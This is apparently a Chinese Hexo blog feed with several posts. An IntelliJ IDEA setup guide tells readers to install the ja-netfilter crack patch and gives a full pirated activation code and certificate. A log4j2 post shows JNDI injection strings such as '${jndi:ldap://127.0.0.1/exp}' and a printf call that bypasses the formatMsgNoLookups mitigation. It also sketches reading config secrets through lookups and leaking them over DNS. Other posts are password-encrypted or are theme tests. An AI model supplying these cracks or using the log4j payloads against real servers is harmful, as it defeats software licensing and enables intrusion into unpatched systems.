AyiNPhDs2z8/COMrxRlZW5mfzo0xsK0dQGNH3UoG/9RVwHG4eS8LFpMTR9oetHZBAgMBAAGjgZkwgZYwCQYDVR0TBAIwADAdBgNVHQ4EFgQUJNoRIpb1hUHAk0foMSNM9MCEAv8wSAYDVR0jBEEwP4AUo562SGdCEjZBvW3gubSgUouX8bOhHKQaMBgxFjAUBgNVBAMMDUpldFByb2ZpbGUgQ0GCCQDSbLGDsoN54TATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMCBaAwDQYJKoZIhvcNAQELBQADggIBABqRoNGxAQct9dQUFK8xqhiZaYPd30TlmCmSAaGJ0eBpvkVeqA2jGYhAQRqFiAlFC63JKvWvRZO1iRuWCEfUMkdqQ9VQPXziE/BlsOIgrL6RlJfuFcEZ8TK3syIfIGQZNCxYhLLUuet2HE6LJYPQ5c0jH4kDooRpcVZ4rBxNwddpctUO2te9UU5/FjhioZQsPvd92qOTsV+8Cyl2fvNhNKD1Uu9ff5AkVIQn4JU23ozdB/R5oUlebwaTE6WZNBs+TA/qPj+5/we9NH71WRB0hqUoLI2AKKyiPw++FtN4Su1vsdDlrAzDj9ILjpjJKA1ImuVcG329/WTYIKysZ1CWK3zATg9BeCUPAV1pQy8ToXOq+RSYen6winZ2OO93eyHv2Iw5kbn1dqfBw1BuTE29V2FJKicJSu8iEOpfoafwJISXmz1wnnWL3V/0NxTulfWsXugOoLfv0ZIBP1xH9kmf22jjQ2JiHhQZP7ZDsreRrOeIQ/c4yR8IQvMLfC0WKQqrHu5ZzXTH4NO3CwGWSlTY74kE91zXB5mwWAx1jig+UXYc2w4RkVhy0//lOmVya/PEepuuTTI4+UJwC7qbVlh5zfhj8oTNUXgN0AOc+Q0/WFPl1aw5VV/VrO8FCoB15lFVlpKaQ1Yh+DVU8ke+rt9Th0BCHXe0uZOEmH0nOnH/0onD</span><br></pre></td></tr></table></figure><ul><li><p>点击Active进行激活</p></li><li><p>perfect！！！</p></li></ul><h2 id="IntelliJ-IDEA-2021-3-3安装配置（推荐）"><a href="#IntelliJ-IDEA-2021-3-3安装配置（推荐）" class="headerlink" title="IntelliJ IDEA 2021.3.3安装配置（推荐）"></a>IntelliJ IDEA 2021.3.3安装配置（推荐）</h2><h3 id="安装包官网下载："><a href="#安装包官网下载：" class="headerlink" title="安装包官网下载："></a>安装包官网下载：</h3><ul><li><a href="https://download.jetbrains.com/idea/ideaIU-2021.3.3.exe">2021.3.3 - Windows x64 (exe)</a></li><li><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/6.png" alt="image-6"> </li></ul><h3 id="安装步骤同上"><a href="#安装步骤同上" class="headerlink" title="安装步骤同上"></a>安装步骤同上</h3><h3 id="补丁下载：-1"><a href="#补丁下载：-1" class="headerlink" title="补丁下载："></a>补丁下载：</h3><ul><li>下载之后，我们这里将其拷贝到C盘根目录下，<code>C:\ja-netfilter-all</code></li><li>Windows 系统，点击运行 <code>install-current-user.vbs</code> 脚本，为当前用户安装破解补丁。</li><li>Mac/Linux 系统，点击运行 <code>install.sh</code> 脚本安装。</li></ul><p><strong>备注：</strong><code>install-all-users.vbs</code> 为系统所有用户安装，不推荐。<code>unistall-*</code>前缀的是卸载补丁脚本。</p><p><img src="/2022/05/16/idea%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE/5.png" alt="image-5"></p><p>运行激活脚本增加环境变量</p><p>我们这里是windows，运行<code>install-current-user.vbs</code>出现弹窗，点击确定！！出现Done代表完成了。可以去环境变量中查看是否成功。</p><h3 id="激活IDEA-1"><a href="#激活IDEA-1" class="headerlink" title="激活IDEA"></a>激活IDEA</h3><ul><li><p>打开IDEA，并输入下面的激活码</p></li><li><p>```<br>4W9NP3KV9E-eyJsaWNlbnNlSWQiOiI0VzlOUDNLVjlFIiwibGljZW5zZWVOYW1lIjoic2NyaXAgd2FuZSIsImFzc2lnbmVlTmFtZSI6IiIsImFzc2lnbmVlRW1haWwiOiIiLCJsaWNlbnNlUmVzdHJpY3Rpb24iOiIiLCJjaGVja0NvbmN1cnJlbnRVc2UiOmZhbHNlLCJwcm9kdWN0cyI6W3siY29kZSI6IklJIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjpmYWxzZX0seyJjb2RlIjoiUERCIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQV1MiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBHTyIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDEtMjQiLCJwYWlkVXBUbyI6IjIwMjMtMDEtMjQiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFBTIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQUEMiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9LHsiY29kZSI6IlBSQiIsImZhbGxiYWNrRGF0ZSI6IjIwMjMtMDEtMjQiLCJwYWlkVXBUbyI6IjIwMjMtMDEtMjQiLCJleHRlbmRlZCI6dHJ1ZX0seyJjb2RlIjoiUFNXIiwiZmFsbGJhY2tEYXRlIjoiMjAyMy0wMS0yNCIsInBhaWRVcFRvIjoiMjAyMy0wMS0yNCIsImV4dGVuZGVkIjp0cnVlfSx7ImNvZGUiOiJQU0kiLCJmYWxsYmFja0RhdGUiOiIyMDIzLTAxLTI0IiwicGFpZFVwVG8iOiIyMDIzLTAxLTI0IiwiZXh0ZW5kZWQiOnRydWV9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</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- ![image-7](./idea安装配置\7.png)</span><br><span class="line"></span><br><span class="line">- 点击Active进行激活，**prefect！！**</span><br><span class="line"></span><br><span class="line">## Java JDK环境变量配置</span><br><span class="line"></span><br><span class="line">### JDK下载（x64）</span><br><span class="line"></span><br><span class="line">- 最新版：https://www.oracle.com/java/technologies/downloads/</span><br><span class="line">- Java 8下载：https://www.oracle.com/java/technologies/downloads/#java8</span><br><span class="line">- Java下载登录绕过：</span><br><span class="line"></span><br><span class="line">### 环境变量配置</span><br><span class="line"></span><br><span class="line">- Win+i 搜索：“编辑系统环境变量”——环境变量——系统变量下**新建**</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  变量名：JAVA_HOME   变量值：自己的安装路径，例如：“D:\xx\Java\jdk-xx.0.2\bin”</span><br></pre></td></tr></table></figure></li><li><p>同样在系统变量下点击<strong>“新建”</strong>：</p></li><li><p>```<br>变量名：ClassPath   变量值：  .;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 找到系统变量中的**Path**，点击编辑——新建——直接复制</span><br><span class="line"></span><br><span class="line">- ```</span><br><span class="line">  %JAVA_HOME%\bin;%JAVA_HOME%\jre\bin</span><br></pre></td></tr></table></figure></li><li><p><strong><em>Ok perfect！</em></strong></p></li></ul>]]></content>
    
    
    <summary type="html">Idea安装配置</summary>
    
    
    
    <category term="Idea" scheme="http://example.com/categories/Idea/"/>
    
    
    <category term="Idea安装" scheme="http://example.com/tags/Idea%E5%AE%89%E8%A3%85/"/>
    
  </entry>
  
  <entry>
    <title>jetbrains全家桶</title>
    <link href="http://example.com/2022/04/25/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    <id>http://example.com/2022/04/25/jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6/</id>
    <published>2022-04-25T10:04:45.000Z</published>
    <updated>2022-11-25T10:06:01.346Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="288db6bf13a41ae9c4e597ed93a7e3cad8ac602c370d69c184e13a732333e54e">f3cf9691fdf9b4e3a5779409e8d0ddc01af1bb920ac3dc04d31d5769f8a47161</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">听说只有管理员才可以查看哦</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="软件资源" scheme="http://example.com/categories/%E8%BD%AF%E4%BB%B6%E8%B5%84%E6%BA%90/"/>
    
    
    <category term="Jetbrains全家桶" scheme="http://example.com/tags/Jetbrains%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
  </entry>
  
  <entry>
    <title>Test-swiper-index</title>
    <link href="http://example.com/2022/03/21/Test-swiper-index/"/>
    <id>http://example.com/2022/03/21/Test-swiper-index/</id>
    <published>2022-03-21T01:22:01.000Z</published>
    <updated>2022-11-25T12:58:44.338Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试swiper——index"><a href="#测试swiper——index" class="headerlink" title="测试swiper——index"></a>测试swiper——index</h1><h2 id="How-to-discover-your-authentic-self-—-at-any-age"><a href="#How-to-discover-your-authentic-self-—-at-any-age" class="headerlink" title="How to discover your authentic self — at any age"></a>How to discover your authentic self — at any age</h2><p>After more than two decades as an anchor for ABC News, an on-air panic attack sent Dan Harris’s life in a new direction: he became a dedicated meditator and, to some, even a guru. But then an anonymous survey of his family, friends and colleagues turned up some brutal feedback — he was still kind of a jerk. In a wise, funny talk, he shares his years-long quest to improve his relationships with everyone (starting with himself) and explains the science behind loving-kindness medita…</p><h2 id="How-to-break-down-barriers-and-not-accept-limits"><a href="#How-to-break-down-barriers-and-not-accept-limits" class="headerlink" title="How to break down barriers and not accept limits"></a>How to break down barriers and not accept limits</h2><ul><li>firest : I don’t know</li><li>second: You know what i’m saying? damnit!</li></ul>]]></content>
    
    
    <summary type="html">测试一下置顶的美化效果</summary>
    
    
    
    <category term="Bufferfly" scheme="http://example.com/categories/Bufferfly/"/>
    
    
    <category term="Bufferfly" scheme="http://example.com/tags/Bufferfly/"/>
    
  </entry>
  
  <entry>
    <title>Test-topBanner&amp;&amp;参数释义</title>
    <link href="http://example.com/2022/03/20/Test-topBanner/"/>
    <id>http://example.com/2022/03/20/Test-topBanner/</id>
    <published>2022-03-20T02:02:52.000Z</published>
    <updated>2022-05-21T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="deb1bcb7f4783a6c3e9720238cf8cc98b6145a0fb1c438db1158f4300aeef5cf">2b3406d62b6174fb947463ad5f2bb2d06e57c7d91e707796abde320f4893dbc6ecbb4fc0e40fc88c7e3ac29f11bdabfbd7f7a6079a295e4f59ca91061a72c912b082bbb978746b458dabd2ae09d1b9607c30b06eb5fa6a0d770955f76b4de060247ebf9c6b70619631a88284348e2355ee58cc0995f7aba3ccedd8722f166d2189ec7f10362f3583a6b81bcfdcb4cdcbdefc043e4976fb6528a34ba3d5072c6fbe452df3c4b61ade722da2eb6fa73e3ae1b1d35c8b975ac52254704cf8dd641a8a30e703b445eea31222d1d80f0a63c4e9c6909b28efdce76765e55bc572d509e5d57cfd6ca7251233fbe757ff7cf9189a88018e0361ced56c37a6392d1979678d4f5ca089e303c08b587a543fcde7afa67f11a4bd6d001252fe1bd7fcf975c7f5599f691bd2e7b6d33ea1203b6a8a2eebcd2298eff6a2d984666f959a86431a9e6d86d94abdd8d4f86982ee87821be27d0e0b055ccc10c94061bc0e96baf0d76ae5e6483008d3c52fd7037d8e626f446087710672a3175d9cf4e33bf161479372cf772f05b4b90f93ca00d3c70240d5568e0cc66eb11e7bd8fa66f1f176b074724235671dadf855f1a8aab0b96d173cbe0578f3244805a12d1625cd1765af5b4a5a0d39fa080c4f10c2ad2299b264ca5fe6ef74db1e3605b63509cef9348f7b13e7fd744545137af7241d73eebc88d50bdae7c5e3b10fbbc8b8bb5b42a4a6af1b4081a28bdccddcde4a1d79d1c5b87bd5d265ea04ab918cee90f6172ef7e20cd155fd13c6297d78ea645dbc4818ef27ae56d8ca23e34a3d7969f734a31d842ef5d176092e099f8b1b9052826f174d10ecd9afe1f866621ace834d7aae99a9ab6a65a3eb989911be3ef771c655d8f15e4bf214d36e963500bb03f2d88b8740a1cf97b9c5826198be5fce5dbb161d70be85a8fe780730d4619dd9a92e91cd52b10f1164ce80bd132a99e07346bf7753dd4519910476bba72de8e5593cd6f3244f425cc2be03dec67c0e6f379cbfdaddbbdb3a0a034e9d28739b5ef9310ddfe4d9a8aacc53b35bef8704d0c6463825fd6952d9e55df84dc6c6e8879f39a52bb8d43bad8c0ea44182c3f5d87e75f549236feb87ce6b71b63ae95c6d295cdd0bfe69f710b61adce4991ecf4ff6dafb741986a0b51c8937282ed445375e5806b260b1174c6bdf9a318f56f53c26f30be56a918a7a23f6a9a384720c9b15ccdad9e2876cebdda68988cde24bc846b94d0f12b2aa7e9ace3a12e7ac4e9003eb11ccf599e91aa72db3596ef971c9d3eeae12681c8b0236b27e29eac67b1a438a900277e2c2e5d832098a5bd1e0d53ccc48682acffccf8a05b6cb04a032c871d00a596067d0399028ae218a3987def12909c8f03f6deea53ccf4513fffadd43a80e8f7f55956f29e131dc51c4821fbb842e1a9bba6bb4121dc986b49cfb8f5c64d97590cad29f179005ed947fa4bdb9d9fff0071e7324d3e983e64469ac6f2a0ce06a35e1b9c1606e595118081186e0dd77be1649734ecfaf6486d200c937a4f2313fef859d9a53399c796e170b15d38ac5f160270e5779326169738e560cfc7c2ba0aa5a284e0a65ba3c5a2c28032d91e7745e97b72d40d5c5eed6c254426fd668224e95c3d0a6c8efda0a778e9bee5bc2266aac2b48ea2a6572d2e48e0210c1f631ebe53fc3ce285fbdb5a821436abc58b176548cd582a68f2dc58f4b26f408102d896db46ce04f13452cdf3536b25eb7abf84557877559e26f2d8b4e7e709fa779c54302f34cb3ed622797c87997d2ad806d6f12f7745c5843c06f11af7310a0df494db326ed8b2a05d4b8218b89b32c57272d19f14b3eb00d3e8a890673d52754c7c049c9a6b81be2879a6d5a815c3b1c7e8fbc0bb3d24f1ea3d380cc521cb55a647fdf4eb6886346d97c53fd7af2df534614df57f10d37e8181bbdbea7d1849f6c79826164b8bb110d912f694eac197f0d0cbc72c0e4181f822fafd8d4a5e70532ab7723b4f6182f36f965ecace14a140e2235ccf5a35084b589afb34e53088684d7295bd0b4b5f87881a3acd9ab3346584007d83e7be04af624c4ffb970fd0e5600e4f53556139f5867312d888ee6da56183d52d5511b6c643d813a0c5865afc69e05baccce5b67da980eda1d62d460c9067ff0f4d534e598bd13b6e31965dee9669eaa911592622ea5de69740cf368b6d08cc7da4ca49d8aafc7e58b3960035c8d7b91983031046980ee1a243f652eecc025f76c4cd091bda328a2e2a26b45c231b7635e3f988003dad898272451142a76e38f4c631db116630a3c84eb9b80a82c7be65bc4d5d73c0613470757f8684dc33d326fe00ac59608f01351e3a3494743c6db962d57d5079ec881915fc03c19d70c560bc218524c823337282ede507d91b59674311d144a18493a49d709490ec76545f5c3ab6cc99411b05611ab37cfe25db4621a36655ea8164c80eaa9909ad4dc4820a1dbfbd670dbcb3ca97edfe08d038ce17c1edd582e3d298d0023b9fd58120de62fc719142fe396db0bf618b16fb096d727d8197d702181285e81a366ffb01f31dbb3a89e53e5386bd046447a6df11e06b2b9f3be166f05041292d924c1df57e1bd66833ffe10aa88ea1ec51cf91a419cce96296d9525905e1845e74ad818efe9d03e39e4efec45ff1d1e7c04c069117b80fdc49ba29bf3d561cbbe374876535e83961dc7252639d119774ce380043cf69c56461ccc66c856f7b20aebc9e29bee16d4790342443de48bec54701d04788194c0f3e4bc6c32536ffd8596e5d3619eaa76c0a55ac4fc34b82484a5b14a03364829a2c909972910f8a1c463ed9c148d8141f3e3e46f4d0d48fee31bc8682845781c66a70788ae817b7084cbb37d004774438e13542d4c9acf40c4cfe4e8d1b2e950d915119ce3391bf6fce32de053de358fbb12eae17ae51f8ef067f2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">旅行者，这里需要密码才可以访问哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">置顶轮番图测试及参数详情解释</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Bugku Misc题解</title>
    <link href="http://example.com/2022/01/21/Bugku-Misc%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/01/21/Bugku-Misc%E9%A2%98%E8%A7%A3/</id>
    <published>2022-01-21T12:49:47.000Z</published>
    <updated>2022-11-23T08:35:32.147Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="b2c125734df563f20b3b250a2b26061ac61cdf240411d61cf1fe105b4e7baa00">b3c9a99c0ccdca4a7128185684909d47c7b4109eddc3e1e95fa17bdb523e92f78380d04f1940ddb6d0b9487c2ecfb925885fe12d6e51b1c9d76a89e97c30f4be414966f2537af82a73c32cdccea3cc217e138f07e383b5d894a47fc3e41505c5d3199a0383148469310eab83d8d311a793e11871453f062214b7ec7459c8e693fb6e48cc2751cf9c1c8423ebec9d58bc7afe2e6927f304422296270ab9668161</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">需要密码的哦！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Here&#39;s something encrypted, password is required to continue reading.</summary>
    
    
    
    <category term="CTF" scheme="http://example.com/categories/CTF/"/>
    
    
    <category term="CTF Misc" scheme="http://example.com/tags/CTF-Misc/"/>
    
  </entry>
  
  <entry>
    <title>闲聊log4j2</title>
    <link href="http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/"/>
    <id>http://example.com/2022/01/19/%E9%97%B2%E8%B0%88log4j2/</id>
    <published>2022-01-19T13:16:05.000Z</published>
    <updated>2022-01-20T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="闲谈log4j2"><a href="#闲谈log4j2" class="headerlink" title="闲谈log4j2"></a>闲谈log4j2</h1><h2 id="log4j2爆炸漏洞"><a href="#log4j2爆炸漏洞" class="headerlink" title="log4j2爆炸漏洞"></a>log4j2爆炸漏洞</h2><p>简单的说一下最近这个log4j2漏洞吧，这个漏洞自己也跟了有一段时间了。第一次在学长那听到了这个漏洞，当时只是跟但了jndi注入点并没有发现漏洞的入口，也就是${jndi:ldap://127.0.0.1/exp}.一方面是没有想到这个功能，但是之后感觉官方文档里面说了<a href="https://logging.apache.org/log4j/2.x/manual/lookups.html#JndiLookup">文档</a>，可能是自己语文水平不太好。(有点吃亏。。。</p><h2 id="挖掘新问题"><a href="#挖掘新问题" class="headerlink" title="挖掘新问题"></a>挖掘新问题</h2><p>然后就是复现漏洞。挖新的问题。当时第一时间感觉这个东西肯定有问题，第一时间就想到了dos。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644571-d87566e9-ac55-44f7-aaf3-0a64beb97b01.png" alt="image-20211218215051277"></p><p>当时因为环境没有配置起就去睡觉了，当时已经是晚上的3点了。</p><p>说一下我当时发现的dos问题大致是因为数组长度我们可以控制造成溢出。第二天中午我大哥就提交了dos漏洞。之后就没有管了。</p><h2 id="绕过rc1"><a href="#绕过rc1" class="headerlink" title="绕过rc1"></a>绕过rc1</h2><p>在然后说一下绕过rc1吧这个东西虽然简单但是我调试了一下午，大概是因为对异常没有处理，也就是在catch中没有return，导致程序会继续执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644576-d80164ab-1879-4e01-a50e-626f1c99bf5e.png" alt="Q`X GHE7UL3 IBYUAB0EFW"></p><p>所以绕过思路就直接让new url(name) 抛出异常就欧克。</p><p>tips:和bypass7u21差不多。。。</p><h2 id="修复问题"><a href="#修复问题" class="headerlink" title="修复问题"></a>修复问题</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">今天看陈师傅写的文章，也就是修复log4j的坑。</span><br><span class="line">在漏洞报出来的时候修复的方法是：</span><br><span class="line"></span><br><span class="line">1.设置配置文件参数 log4j2.formatMsgNoLookups=true,</span><br><span class="line">2.vm启动环境参数 -Dlog4j2.formatMsgNolookups=true,</span><br><span class="line">3,设置系统环境变量 FORMAT_MESSAGES_PATTERN_DISABLE_LOOKUPS 设置为true</span><br><span class="line">而这样的修复是打破这个判断</span><br></pre></td></tr></table></figure><p><img src="https://user-images.githubusercontent.com/63966847/146644579-6ed47eaf-8666-42ed-be31-7a01d83d860c.png" alt="image-20211215142114290"></p><p>认真看该代码其实在下面还有一个入口。</p><p><img src="https://user-images.githubusercontent.com/63966847/146644583-ac2f76eb-028d-4afb-8f72-e5848746b49c.png" alt="image-20211215142251448"></p><p>可以看到判断条件是 <strong>msg instanceof StringBuilderFormattable</strong></p><p>所以可以走第二个入口就绕过了log4j2.formatMsgNoLookups=true的判断</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">log.printf(Level.ERROR,<span class="string">&quot;$&#123;jndi:ldap://127.0.0.1:2333&#125;&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd">https://mp.weixin.qq.com/s?__biz=MzIxNDAyNjQwNg==&amp;mid=2456098698&amp;idx=1&amp;sn=8c66b476cb303bdf413337bc5c92e127&amp;chksm=803c6643b74bef55d1606a424e555ef09e27b8736928acdca027332453c6d9e4d7a11d7e589d&amp;mpshare=1&amp;scene=23&amp;srcid=1215Twk8iymC8x9gXD72dMTK&amp;sharer_sharetime=1639550097318&amp;sharer_shareid=20feca07eb3065d70e5194c2cdd097b3#rd</a></p><p><a href="https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg">https://mp.weixin.qq.com/s/vAE89A5wKrc-YnvTr0qaNg</a></p></blockquote><h2 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h2><p>信息泄露这个问题我在漏洞刚刚出来的那天晚上就想到了，只是对比rce，信息泄露就微不足道。因为log4j2支持很多协议 sys等等可以看到env等等这些的信息，然后通过dns带出来。</p><p>不过值得说一下其中有一个思路通过ResourceBundleLookup类去获得读取项目中后缀为properties的配置文件，其中就可能有username/password。当时我是看到了只是不知道这个方法是干啥子的也没有去百度。。。哭死了。</p><p><a 